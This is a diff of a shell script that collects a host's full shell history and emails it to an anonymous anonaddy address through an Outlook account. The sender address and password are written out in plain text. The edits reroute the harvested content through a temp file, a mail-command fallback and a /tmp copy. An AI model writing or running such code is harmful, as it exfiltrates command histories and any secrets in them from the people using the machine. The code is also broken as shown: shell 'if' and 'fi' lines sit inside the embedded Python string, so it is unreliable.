@@ -73,17 +73,21 @@ EOF
 
     recipient="ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com"
     subject="Full Shell History Report from $HOSTNAME"
-    body="$EMAIL_CONTENT"
 
     smtp_server="smtp-mail.outlook.com"
     port=587
     sender_email="kxs39585@outlook.de"
     password="55Marko55"
 
+    # Create a temporary file to store the email content
+    TEMP_FILE=$(mktemp)
+    echo -n "$EMAIL_CONTENT" > "$TEMP_FILE"
+
     # Try sending email via Python
     python -c "
 import smtplib
 import ssl
+import os
 
 port = $port
 smtp_server = '$smtp_server'
@@ -91,28 +95,29 @@ sender_email = '$sender_email'
 password = '$password'
 receiver_email = '$recipient'
 subject = '$subject'
-body = '''$body'''
+body_file = '$TEMP_FILE'
+
+with open(body_file, 'r', encoding='utf-8', errors='ignore') as f:
+    body = f.read()
+
 message = f'Subject: {subject}\\n\\n{body}'
 
 context = ssl.create_default_context()
 try:
-    encoded_message = message.encode('utf-8', errors='surrogateescape')
     with smtplib.SMTP(smtp_server, port) as server:
         server.ehlo()
         server.starttls(context=context)
         server.ehlo()
         server.login(sender_email, password)
-        server.sendmail(sender_email, receiver_email, encoded_message)
+        server.sendmail(sender_email, receiver_email, message.encode('utf-8', errors='ignore'))
     print('Email sent successfully via Python using Outlook.com.')
-except UnicodeEncodeError as e:
-    print(f'UnicodeEncodeError in Python using Outlook.com: {e}')
 except Exception as e:
     print(f'Error sending email via Python using Outlook.com: {e}')
     print(f'Details: {e}')
     # Fallback to using mail command if available
     if command -v mail &>/dev/null; then
         echo "Sending email using mail command..."
-        echo \"$EMAIL_CONTENT\" | mail -s \"$subject\" \"$recipient\"
+        cat \"$TEMP_FILE\" | mail -s \"$subject\" \"$recipient\"
         if [ \$? -eq 0 ]; then
             echo "Email sent successfully via mail command."
         else
@@ -120,9 +125,12 @@ except Exception as e:
         fi
     else
         echo "Warning: mailutils not installed - storing report in /tmp/system_report.txt"
-        echo \"$EMAIL_CONTENT\" > /tmp/system_report.txt
+        cat \"$TEMP_FILE\" > /tmp/system_report.txt
         echo "System report stored in /tmp/system_report.txt"
     fi
+finally:
+    # Clean up the temporary file
+    rm -f \"$TEMP_FILE\"
 "
 }
 
